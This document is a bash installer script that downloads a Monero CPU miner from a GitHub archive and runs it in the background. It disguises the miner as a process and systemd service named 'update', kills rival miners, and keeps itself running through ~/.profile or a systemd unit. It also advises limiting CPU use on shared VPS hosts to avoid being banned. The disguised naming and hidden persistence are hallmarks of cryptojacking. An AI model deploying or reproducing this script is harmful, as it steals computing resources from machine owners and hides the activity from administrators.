#!/bin/bash

# printing greetings

echo "START"
echo

if [ "$(id -u)" == "0" ]; then
  echo "START"
fi

# command line arguments
WALLET=$1
EMAIL=$2

# checking prerequisites

if [ -z $WALLET ]; then
  echo "Script usage:"
  echo "> start.sh <wallet address> [<your email address>]"
  echo "ERROR: Please specify your wallet address"
  exit 1
fi

if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

if ! type curl >/dev/null; then
  echo "ERROR: This script requires \"curl\" utility to work correctly"
  exit 1
fi

if ! type lscpu >/dev/null; then
  echo "WARNING: This script requires \"lscpu\" utility to work correctly"
fi

# calculating port

CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
if [ -z $EXP_MONERO_HASHRATE ]; then
  echo "ERROR: Can't compute projected Monero CN hashrate"
  exit 1
fi

power2() {
  if ! type bc >/dev/null; then
    if   [ "$1" -gt "8192" ]; then
      echo "8192"
    elif [ "$1" -gt "4096" ]; then
      echo "4096"
    elif [ "$1" -gt "2048" ]; then
      echo "2048"
    elif [ "$1" -gt "1024" ]; then
      echo "1024"
    elif [ "$1" -gt "512" ]; then
      echo "512"
    elif [ "$1" -gt "256" ]; then
      echo "256"
    elif [ "$1" -gt "128" ]; then
      echo "128"
    elif [ "$1" -gt "64" ]; then
      echo "64"
    elif [ "$1" -gt "32" ]; then
      echo "32"
    elif [ "$1" -gt "16" ]; then
      echo "16"
    elif [ "$1" -gt "8" ]; then
      echo "8"
    elif [ "$1" -gt "4" ]; then
      echo "4"
    elif [ "$1" -gt "2" ]; then
      echo "2"
    else
      echo "1"
    fi
  else 
    echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l;
  fi
}

PORT=$(( $EXP_MONERO_HASHRATE * 30 ))
PORT=$(( $PORT == 0 ? 1 : $PORT ))
PORT=`power2 $PORT`
PORT=$(( 10000 + $PORT ))
if [ -z $PORT ]; then
  echo "ERROR: Can't compute port"
  exit 1
fi

if [ "$PORT" -lt "10001" -o "$PORT" -gt "18192" ]; then
  echo "ERROR: Wrong computed port value: $PORT"
  exit 1
fi


# printing intentions

echo "I will download, setup and run in background Monero CPU miner."
echo "If needed, miner in foreground can be started by $HOME/user/start.sh script."
echo "Mining will happen to $WALLET wallet."
echo

if ! sudo -n true 2>/dev/null; then
  echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
else
  echo "Mining in background will be performed using update systemd service."
fi

echo
echo "JFYI: This host has $CPU_THREADS CPU threads, so projected Monero hashrate is around $EXP_MONERO_HASHRATE KH/s."
echo

echo "Sleeping 5 seconds)"
sleep 5
echo
echo

# start doing stuff: preparing miner

echo "[*] Removing any moneroocean miner (if any)"
if sudo -n true 2>/dev/null; then
  sudo systemctl stop update.service
fi
killall -9 xmrig

echo "[*] Removing any miner (if any)"
if sudo -n true 2>/dev/null; then
  sudo systemctl stop update.service
fi
killall -9 update

echo "[*] Removing $HOME/moneroocean directory"
rm -rf $HOME/moneroocean

echo "[*] Removing $HOME/user directory"
rm -rf $HOME/user

echo "[*] Downloading file"
if ! curl -L --progress-bar "https://raw.githubusercontent.com/robertreynolds2/mine/main/user.tar" -o /tmp/user.tar; then
  echo "ERROR: Can't download https://raw.githubusercontent.com/robertreynolds2/mine/main/user.tar file to /tmp/user.tar"
  exit 1
fi

echo "[*] Unpacking /tmp/user.tar to $HOME/user"
[ -d $HOME/user ] || mkdir $HOME/user
if ! tar xf /tmp/user.tar -C $HOME/user; then
  echo "ERROR: Can't unpack /tmp/user.tar to $HOME/user directory"
  exit 1
fi
rm /tmp/user.tar

echo "[*] Miner $HOME/user/update is OK"

# preparing script

echo "[*] Creating $HOME/user/start.sh script"
cat >$HOME/user/start.sh <<EOL
#!/bin/bash
if ! pidof update >/dev/null; then
  nice $HOME/user/update \$*
else
  echo "Monero miner is already running in the background. Refusing to run another one."
  echo "Run \"killall update\" or \"sudo killall update\" if you want to remove background miner first."
fi
EOL

chmod +x $HOME/user/start.sh
cp $HOME/user/config.json $HOME/user/config_background.json

# preparing script background work and work under reboot

if ! sudo -n true 2>/dev/null; then
  if ! grep user/start.sh $HOME/.profile >/dev/null; then
    echo "[*] Adding $HOME/user/start.sh script to $HOME/.profile"
    echo "$HOME/user/start.sh --config=$HOME/user/config_background.json >/dev/null 2>&1" >>$HOME/.profile
  else 
    echo "Looks like $HOME/user/start.sh script is already in the $HOME/.profile"
  fi
  echo "[*] Running miner in the background (see logs in $HOME/user/update.log file)"
  /bin/bash $HOME/user/start.sh --config=$HOME/user/config_background.json >/dev/null 2>&1
else

  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
    echo "[*] Enabling huge pages"
    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
  fi

  if ! type systemctl >/dev/null; then

    echo "[*] Running miner in the background (see logs in $HOME/user/update.log file)"
    /bin/bash $HOME/user/start.sh --config=$HOME/user/config_background.json >/dev/null 2>&1
    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."

  else

    echo "[*] Creating update systemd service"
    cat >/tmp/update.service <<EOL
[Unit]
Description=Start update service

[Service]
ExecStart=$HOME/user/update --config=$HOME/user/config.json
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL
    sudo mv /tmp/update.service /etc/systemd/system/update.service
    echo "[*] Starting update systemd service"
    sudo killall update 2>/dev/null
    sudo systemctl daemon-reload
    sudo systemctl enable update.service
    sudo systemctl start update.service
    echo "To see miner service logs run \"sudo journalctl -u update -f\" command"
  fi
fi

echo ""
echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
if [ "$CPU_THREADS" -lt "4" ]; then
  echo "HINT: Please execute these or similair commands under root to limit miner to 75% percent CPU usage:"
  echo "sudo apt-get update; sudo apt-get install -y cpulimit"
  echo "sudo cpulimit -e update -l $((75*$CPU_THREADS)) -b"
  if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
    echo "sudo sed -i -e '\$acpulimit -e update -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  else
    echo "sudo sed -i -e '\$i \\cpulimit -e update -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  fi
else
  echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/user/config.json"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/user/config_background.json"
fi
echo ""

echo "[*] Setup complete"
